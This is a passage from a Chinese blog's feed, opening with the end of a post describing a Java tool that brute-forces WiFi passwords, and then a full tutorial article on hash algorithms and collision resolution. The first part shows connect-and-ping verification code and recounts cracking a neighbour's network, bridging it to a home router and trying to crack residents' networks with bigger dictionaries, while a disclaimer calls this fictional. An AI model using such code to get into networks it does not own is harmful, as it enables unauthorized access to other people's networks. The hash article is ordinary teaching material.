(result.get(0).contains(&quot;添加到接口&quot;)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 连接wifi</span><br><span class="line"> *</span><br><span class="line"> * @param ssid 添加配置文件</span><br><span class="line"> */</span><br><span class="line">private static boolean connect(String ssid) &#123;</span><br><span class="line">    boolean connected = false;</span><br><span class="line">    String cmd = Command.CONNECT.replace(&quot;SSID_NAME&quot;, ssid);</span><br><span class="line">    List&lt;String&gt; result = execute(cmd, null);</span><br><span class="line">    if (result != null &amp;&amp; result.size() &gt; 0) &#123;</span><br><span class="line">        if (result.get(0).contains(&quot;已成功完成&quot;)) &#123;</span><br><span class="line">            connected = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return connected;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * ping 校验</span><br><span class="line"> */</span><br><span class="line">private static boolean ping() &#123;</span><br><span class="line">    boolean pinged = false;</span><br><span class="line">    String cmd = &quot;ping &quot; + Connector.PING_DOMAIN;</span><br><span class="line">    List&lt;String&gt; result = execute(cmd, null);</span><br><span class="line">    if (result != null &amp;&amp; result.size() &gt; 0) &#123;</span><br><span class="line">        for (String item : result) &#123;</span><br><span class="line">            if (item.contains(&quot;来自&quot;)) &#123;</span><br><span class="line">                pinged = true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return pinged;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>两点释疑：</strong></p><p>1.为什么需要sleep(50)? 因为在连接后，电脑没有立即反应过来，此时去ping的话，就算密码正确，都会ping不成功。所以需要sleep。我破解的时候sleep(1000)的，还没测试50行不行。</p><p>2.为什么需要ping网站? 因为在第二步连接的时候，不管有没有连接成功，都会出现 ‘已成功完成xx连接’ 的字样。所以没办法，只有用ping来校验，不过我相信一定能够优化的。</p><p>这一步我开启了多线程，去验证，有人说为什么用多线程，明明验证方法都 synchronized 了，我想说的是，单线程的话，之间总会有间隙的，所以为了压榨那一点点时间，我用了多线程。</p><h1 id="五、连接成功"><a href="#五、连接成功" class="headerlink" title="五、连接成功"></a>五、连接成功</h1><p>OK,至此，为师已将毕生功力传授给你了，你出去就说是三年经验了。呸，说错了，至此，整个流程大概就已经出来了，接下来就run你的程序吧。等待密码的破解。</p><p>我一共在我家周围瞄上了三个信号看起来还可以的wifi。用这个程序跑了40多秒，开了一个wifi的密码 12345678。耶成功了终于可以用了。</p><p>然后根据密码，把自家路由器设置一个桥接模式。家里处处都有网了。</p><h1 id="五、或者放弃"><a href="#五、或者放弃" class="headerlink" title="五、或者放弃"></a>五、或者放弃</h1><p>或者，你也可以放弃。愉快地用了一晚上过后，我第二天早上起来发现网断了，原来那个网不存在了，但是到了中午又有了。我估计是底商闭店了，就断电了，网就没了。</p><p>于是想要撬开一个住户的网，跑了两个看起来信号比较好的网络，都以失败告终！！！因为密码字典不够强大。网上下过几个字典生成器，都不能用。算了吧先凑合用着现在的网络，等我有空了，写个字典生成器，来撬开。</p><p>等我密码生成器出来了，会继续更新。欢迎持续关注。。。</p><p><strong>PS：本文代码已托管到github，若有兴趣，欢迎浏览<a href="https://github.com/weechang/wifi-connector" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/weechang/wifi-connector</a></strong></p><p><strong>严正申明：</strong> 文中所有行为均为杜撰，请广大网友切勿利用本博文内容做出任何危害网络安全的行为。若有违法行为，均与本人无关。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;由于新搬的地方没有覆盖移动的宽带，最近手头又紧。所以暂时先没安宽带，但是一天用流量，也撑不住啊。看着流量哗啦啦的溜走。住的地方在6楼，然后房子是底商的格局，于是就动起了蹭网的小心思，一下记录蹭网全过程。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="开源之路" scheme="https://blog.weechang.xyz/categories/%E5%BC%80%E6%BA%90%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Java" scheme="https://blog.weechang.xyz/tags/Java/"/>
    
      <category term="破解WIFI" scheme="https://blog.weechang.xyz/tags/%E7%A0%B4%E8%A7%A3WIFI/"/>
    
  </entry>
  
  <entry>
    <title>哈希算法究竟是个什么鬼</title>
    <link href="https://blog.weechang.xyz/2018/10/19/hash/"/>
    <id>https://blog.weechang.xyz/2018/10/19/hash/</id>
    <published>2018-10-19T05:28:01.000Z</published>
    <updated>2018-10-19T10:10:07.452Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一直以来写博客都是抱着给别人看的心态写的，其实，别人看了又怎样，重要的是自己写的过程。这几天终于想明白了这个道理，但是博客该有的套路还是得一个不少的加上。最近感觉写Java方面的知识有些厌倦了，于是干脆写点自己想写的。</p></blockquote><a id="more"></a><p>曾经面试被问到过哈希算法，而曾经的我什么都不懂，就在那儿乱扯一通，现在看来那个时候的自己真的好笑。于是准备补上这个坑，搜集汇总哈希算法的相关只是于此。</p><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>我们如何比较两个文件是否一致呢？</p><p>将文件读成二进制流，然后比较两个文件的二进制流？如果二进制流一开始就不一样还好说，或者是文件小都好说。但是如果是大文件呢？如果文件最后几位二进制不一样，这怎么办？耗时太久。</p><p>这个时候我们就需要一个高效而可靠办法，给每个文件一个唯一的ID，然后直接比较两个ID，这貌似是一个不错的方法。嗯，想一想很不错。但是如何确定两个文件的ID不同呢？这时候就可以用到HASH方法了。</p><h1 id="二、简介"><a href="#二、简介" class="headerlink" title="二、简介"></a>二、简介</h1><p><strong>散列算法（Hash Algorithm）</strong>，又称哈希算法，杂凑算法，是一种从任意文件中创造小的数字「指纹」的方法。与指纹一样，散列算法就是一种以较短的信息来保证文件唯一性的标志，这种标志与文件的每一个字节都相关，而且难以找到逆向规律。因此，当原有文件发生改变时，其标志值也会发生改变，从而告诉文件使用者当前的文件已经不是你所需求的文件。</p><h1 id="三、应用"><a href="#三、应用" class="headerlink" title="三、应用"></a>三、应用</h1><p>哈希算法，目前在信息安全领域主要用到以下几个方面：</p><ul><li>文件校验</li></ul><p>我们常见的很多文件下载的时候，除了能够下载具体的文件外，还有很多会给出文件的MD5码。这就是用于文件校验使用的。因为在传统的加密渠道中，我们只能对文件传输过程中的信道进行容错处理，但是不能对抗恶意的文件篡改问题。所以如果有了MD5码，我们就能够通过MD5码，校验我们收到的问题件是否是未经篡改的文件。</p><ul><li>数字签名</li></ul><p>Hash 算法也是现代password体系中的一个重要组成部分。因为非对称算法的运算速度较慢，所以在数字签名协议中，单向散列函数扮演了一个重要的角色。 对 Hash 值，又称”数字摘要”进行数字签名，在统计上能够觉得与对文件本身进行数字签名是等效的。</p><ul><li>鉴权协议</li></ul><p>当数据在传输信道是可被侦听，但不可被篡改的情况下，这是一种简单而安全的方法。</p><h1 id="四、实现"><a href="#四、实现" class="headerlink" title="四、实现"></a>四、实现</h1><p>Hash算法最主要的目的就是为了将一个大范围映射到一个小范围。将大范围映射到小范围是为了节省空间。另外，还要使Hash值足够唯一，这样ID才具有唯一性。除此之外，Hash算法还得具有单向性。</p><p>具体说来，Hash算法应该具有以下几个限制点：</p><ul><li>Hash的主要原理就是把大范围映射到小范围；所以，你输入的实际值的个数必须和小范围相当或者比它更小。不然冲突就会非常多。</li><li>Hash逼近单向函数；所以，你能够用它来对数据进行加密。</li><li>不同的应用对Hash函数有着不同的要求；比方，用于加密的Hash函数主要考虑它和单项函数的差距，而用于查找的Hash函数主要考虑它映射到小范围的冲突率。</li></ul><p>明白了这几点，我们就能够对Hash函数的实现做一些了解了。总的说来，目前主流的Hash算法有以下几种实现方法：</p><h2 id="1-加法Hash"><a href="#1-加法Hash" class="headerlink" title="1. 加法Hash"></a>1. 加法Hash</h2><p>所谓的加法Hash就是把输入元素一个一个的加起来构成最后的结果。标准的加法Hash的构造例如以下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">static int additiveHash(String key, int prime)&#123;</span><br><span class="line">    int hash, i;</span><br><span class="line">    for (hash = key.length(), i = 0; i &lt; key.length(); i++)</span><br><span class="line">    hash += key.charAt(i);</span><br><span class="line">    return (hash % prime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的prime是随意的质数，看得出，结果的值域为[0,prime-1]。</p><h2 id="2-位运算Hash"><a href="#2-位运算Hash" class="headerlink" title="2. 位运算Hash"></a>2. 位运算Hash</h2><p>这类型Hash函数通过利用各种位运算（常见的是移位和异或）来充分的混合输入元素。比方，标准的旋转Hash的构造例如以下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">static int rotatingHash(String key, int prime) &#123;</span><br><span class="line">    int hash, i;</span><br><span class="line">    for (hash=key.length(), i=0; i&lt;key.length(); ++i)</span><br><span class="line">        hash = (hash&lt;&lt;4)^(hash&gt;&gt;28)^key.charAt(i);</span><br><span class="line">    return (hash % prime);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>先移位，然后再进行各种位运算是这样的类型Hash函数的主要特点。比方，以上的那段计算hash的代码还能够有例如以下几种变形：</p><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash = (hash&lt;&lt;5)^(hash&gt;&gt;27)^key.charAt(i);</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hash += key.charAt(i);</span><br><span class="line">hash += (hash &lt;&lt; 10);</span><br><span class="line">hash ^= (hash &gt;&gt; 6);</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if((i&amp;1) == 0)&#123;</span><br><span class="line">    hash ^= (hash&lt;&lt;7) ^ key.charAt(i) ^ (hash&gt;&gt;3);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    hash ^= ~((hash&lt;&lt;11) ^ key.charAt(i) ^ (hash &gt;&gt;5));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash += (hash&lt;&lt;5) + key.charAt(i);</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash = key.charAt(i) + (hash&lt;&lt;6) + (hash&gt;&gt;16) – hash;</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash ^= ((hash&lt;&lt;5) + key.charAt(i) + (hash&gt;&gt;2));</span><br></pre></td></tr></table></figure></li></ul><h2 id="3-乘法Hash"><a href="#3-乘法Hash" class="headerlink" title="3. 乘法Hash"></a>3. 乘法Hash</h2><p>这种类型的Hash函数利用了乘法的不相关性（乘法的这种性质，最有名的莫过于平方取头尾的随机数生成算法，虽然这种算法效果并不好）。比如，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">static int bernstein(String key) &#123;</span><br><span class="line">    int hash = 0;</span><br><span class="line">    int i;</span><br><span class="line">    for (i=0; i&lt;key.length(); ++i) </span><br><span class="line">        hash = 33*hash + key.charAt(i);</span><br><span class="line">    return hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jdk5.0里面的String类的hashCode()方法也使用乘法Hash。不过，它使用的乘数是31。推荐的乘数还有：131, 1313, 13131, 131313等等。</p><p>使用这种方式的著名Hash函数还有：</p><ul><li>32位FNV算法</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int M_SHIFT = 0;</span><br><span class="line">public int FNVHash(byte[] data) &#123;</span><br><span class="line">    int hash = (int)2166136261L;</span><br><span class="line">    for(byte b : data)</span><br><span class="line">        hash = (hash * 16777619) ^ b;</span><br><span class="line">    if (M_SHIFT == 0)</span><br><span class="line">        return hash;</span><br><span class="line">    return (hash ^ (hash &gt;&gt; M_SHIFT)) &amp; M_MASK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>以及改进的FNV算法：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public static int FNVHash1(String data) &#123;</span><br><span class="line">    final int p = 16777619;</span><br><span class="line">    int hash = (int)2166136261L;</span><br><span class="line">    for(int i=0;i&lt;data.length();i++)</span><br><span class="line">        hash = (hash ^ data.charAt(i)) * p;</span><br><span class="line">    hash += hash &lt;&lt; 13;</span><br><span class="line">    hash ^= hash &gt;&gt; 7;</span><br><span class="line">    hash += hash &lt;&lt; 3;</span><br><span class="line">    hash ^= hash &gt;&gt; 17;</span><br><span class="line">    hash += hash &lt;&lt; 5;</span><br><span class="line">    return hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了乘以一个固定的数，常见的还有乘以一个不断改变的数，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">static int RSHash(String str)&#123;</span><br><span class="line">    int b = 378551;</span><br><span class="line">    int a = 63689;</span><br><span class="line">    int hash = 0;</span><br><span class="line">    for(int i = 0; i &lt; str.length(); i++)&#123;</span><br><span class="line">        hash = hash * a + str.charAt(i);</span><br><span class="line">        a = a * b;</span><br><span class="line">    &#125;</span><br><span class="line">    return (hash &amp; 0x7FFFFFFF);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然Adler32算法的应用没有CRC32广泛，不过，它可能是乘法Hash里面最有名的一个了。关于它的介绍，大家可以去看RFC 1950规范。</p><h2 id="4-除法Hash"><a href="#4-除法Hash" class="headerlink" title="4. 除法Hash"></a>4. 除法Hash</h2><p>除法和乘法一样，同样具有表面上看起来的不相关性。不过，因为除法太慢，这种方式几乎找不到真正的应用。需要注意的是，我们在前面看到的hash的 结果除以一个prime的目的只是为了保证结果的范围。如果你不需要它限制一个范围的话，可以使用如下的代码替代”hash%prime”：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash = hash ^ (hash&gt;&gt;10) ^ (hash&gt;&gt;20)</span><br></pre></td></tr></table></figure><h2 id="5-查表Hash"><a href="#5-查表Hash" class="headerlink" title="5. 查表Hash"></a>5. 查表Hash</h2><p>查表Hash最有名的样例莫过于CRC系列算法。尽管CRC系列算法本身并非查表，可是，查表是它的一种最快的实现方式。以下是CRC32的实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">static int crctab[256] = &#123;</span><br><span class="line">0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3, </span><br><span class="line">0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988, 0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, </span><br><span class="line">0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7, </span><br><span class="line">0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5, </span><br><span class="line">0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172, 0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, </span><br><span class="line">0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59, </span><br><span class="line">0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f, </span><br><span class="line">0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924, 0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, </span><br><span class="line">0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433, </span><br><span class="line">0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01, </span><br><span class="line">0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e, 0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, </span><br><span class="line">0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65, </span><br><span class="line">0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb, </span><br><span class="line">0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0, 0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, </span><br><span class="line">0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f, </span><br><span class="line">0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad, </span><br><span class="line">0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a, 0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, </span><br><span class="line">0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1, </span><br><span class="line">0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7, </span><br><span class="line">0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc, 0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, </span><br><span class="line">0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b, </span><br><span class="line">0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79, </span><br><span class="line">0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236, 0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, </span><br><span class="line">0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d, </span><br><span class="line">0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713, </span><br><span class="line">0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38, 0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, </span><br><span class="line">0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777, </span><br><span class="line">0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45, </span><br><span class="line">0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2, 0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, </span><br><span class="line">0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9, </span><br><span class="line">0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf, </span><br><span class="line">0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94, 0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d</span><br><span class="line">&#125;;</span><br><span class="line">int crc32(String key, int hash) &#123;</span><br><span class="line">    int i;</span><br><span class="line">    for (hash=key.length(), i=0; i&lt;key.length(); ++i)</span><br><span class="line">        hash = (hash &gt;&gt; 8) ^ crctab[(hash &amp; 0xff) ^ k.charAt(i)];</span><br><span class="line">    return hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查表Hash中有名的样例有：Universal Hashing和Zobrist Hashing。他们的表格都是随机生成的。</p><h2 id="6-混合Hash"><a href="#6-混合Hash" class="headerlink" title="6. 混合Hash"></a>6. 混合Hash</h2><p>混合Hash算法利用了以上各种方式。各种常见的Hash算法，比如MD5、Tiger都属于这个范围。它们一般很少在面向查找的Hash函数里面使用。</p><h2 id="7-数组Hash"><a href="#7-数组Hash" class="headerlink" title="7. 数组Hash"></a>7. 数组Hash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">inline int hashcode(const int *v) &#123;</span><br><span class="line">    int s = 0;</span><br><span class="line">    for(int i=0; i&lt;k; i++)</span><br><span class="line">        s=((s&lt;&lt;2)+(v[i]&gt;&gt;4))^(v[i]&lt;&lt;10);</span><br><span class="line">    s = s % M;</span><br><span class="line">    s = s &lt; 0 ? s + M : s;</span><br><span class="line">    return s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="五、碰撞"><a href="#五、碰撞" class="headerlink" title="五、碰撞"></a>五、碰撞</h1><p>通过前面说到的几种Hash算法的实现，我们可以发现，Hash算法虽然很多好，但是无法保证两个片段产生的Hash值不能重复。Hash算法产生冲突的情况，称之为Hash冲突，也称之为Hash碰撞。</p><p>通过构造性能良好的Hash算法，可以减少冲突，但一般不可能完全避免冲突，因此解决冲突是Hash算法的另一个关键问题。目前解决Hash冲突的主流方法大概有以下几种：</p><h2 id="1-开放寻址法-再散列法"><a href="#1-开放寻址法-再散列法" class="headerlink" title="1. 开放寻址法(再散列法)"></a>1. 开放寻址法(再散列法)</h2><p>开放寻址法的基本思想是：当关键字key的哈希地址p=H（key）出现冲突时，以p为基础，产生另一个哈希地址p1，如果p1仍然冲突，再以p为基础，产生另一个哈希地址p2，…，直到找出一个不冲突的哈希地址pi ，将相应元素存入其中。这种方法有一个通用的再散列函数形式：</p><p>Hi=（H（key）+di）% m i=1，2，…，n</p><p>其中H（key）为哈希函数，m 为表长，di称为增量序列。</p><h2 id="2-再哈希法"><a href="#2-再哈希法" class="headerlink" title="2. 再哈希法"></a>2. 再哈希法</h2><p>这种方法的基本思想是：同时构造多个不同的哈希函数：</p><p>Hi=RH1（key） i=1，2，…，k</p><p>当哈希地址Hi=RH1（key）发生冲突时，再计算Hi=RH2（key）……，直到冲突不再产生。这种方法不易产生聚集，但增加了计算时间。</p><h2 id="3-链地址法（拉链法）"><a href="#3-链地址法（拉链法）" class="headerlink" title="3. 链地址法（拉链法）"></a>3. 链地址法（拉链法）</h2><p>这种方法的基本思想是：将所有哈希地址为i的元素构成一个称为同义词链的单链表，并将单链表的头指针存在哈希表的第i个单元中，因而查找、插入和删除主要在同义词链中进行。链地址法适用于经常进行插入和删除的情况。</p><h2 id="4-建立公共溢出区"><a href="#4-建立公共溢出区" class="headerlink" title="4. 建立公共溢出区"></a>4. 建立公共溢出区</h2><p>这种方法的基本思想是：将哈希表分为基本表和溢出表两部分，凡是和基本表发生冲突的元素，一律填入溢出表。</p><p>目前用的比较多的就是 <strong>开放寻址法</strong> 和 <strong>拉链法</strong> ,针对 开放寻址法 和 拉链法 其具体的优缺点如下：</p><h3 id="拉链法"><a href="#拉链法" class="headerlink" title="拉链法"></a>拉链法</h3><ul><li>优点：</li></ul><p>1.避免了动态调整的开销</p><p>2.由于底层是链表结构，所以尤其适合那种记录本身尺寸（size）很大的情况，因为此时指针的开销可以忽略不计了</p><p>3.同样也是因为链表结构，删除记录时，比较方便，直接通过指针操作即可</p><ul><li>缺点：</li></ul><p>1.由于链表结构，所以查询比较耗时</p><p>2.由于链表结构，不利于序列化操作</p><h3 id="开放寻址法"><a href="#开放寻址法" class="headerlink" title="开放寻址法"></a>开放寻址法</h3><ul><li>优点</li></ul><p>1.记录更容易进行序列化（serialize）操作</p><ul><li>缺点</li></ul><p>1.存储记录的数目不能超过桶数组的长度，如果超过就需要扩容，而扩容会导致某次操作的时间成本飙升</p><p>2.使用探测序列，有可能其计算的时间成本过高，导致哈希表的处理性能降低</p><p>3.由于记录是存放在桶数组中的，而桶数组必然存在空槽，所以当记录本身尺寸（size）很大并且记录总数规模很大时，空槽占用的空间会导致明显的内存浪费</p><p>4.删除记录时，比较麻烦。比如需要删除记录a，记录b是在a之后插入桶数组的，但是和记录a有冲突，是通过探测序列再次跳转找到的地址，所以如果直接删除a，a的位置变为空槽，而空槽是查询记录失败的终止条件，这样会导致记录b在a的位置重新插入数据前不可见，所以不能直接删除a，而是设置删除标记。这就需要额外的空间和操作。</p><p><strong>总结：拉链法适合数据量不可预知，且写入多，查询少的情况。开放寻址法适合数据量可预知，查询多，写入少的情况。</strong></p><p>在传统的JDK中，采用的都是拉链法，自JDK1.8起，对拉链法做了改造。当链表长度超过预定值后将采用红黑树结构替代链表结构，这样对查询操作做了更好的优化。具体可参考我之前写的关于HashMap的文章 <a href="/2018/07/30/Java集合-0——HashMap类/">Java集合-0——HashMap类</a></p><p><strong>PS: 文中对Hash算法实现的代码均源于网络，若有侵权，请联系删除 <a href="https://blog.csdn.net/tanga842428/article/details/79850832" rel="external nofollow noopener noreferrer" target="_blank">原文链接</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;一直以来写博客都是抱着给别人看的心态写的，其实，别人看了又怎样，重要的是自己写的过程。这几天终于想明白了这个道理，但是博客该有的套路还是得一个不少的加上。最近感觉写Java方面的知识有些厌倦了，于是干脆写点自己想写的。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="算法与数据结构" scheme="https://blog.weechang.xyz/categories/%E7%AE%97%E6%B3%95%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
      <category term="哈希算法" scheme="https://blog.weechang.xyz/tags/%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95/"/>
    
      <category term="算法" scheme="https://blog.weechang.xyz/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>【Java学习之从头开始】Java多线程-3——synchronized是如何工作的</title>
    <link href="https://blog.weechang.xyz/2018/10/03/java-thread-03-synchronized/"/>
    <id>https://blog.weechang.xyz/2018/10/03/java-thread-03-synchronized/</id>
    <published>2018-10-03T14:15:42.000Z</published>
    <updated>2018-10-08T02:48:56.975Z</updated>
    
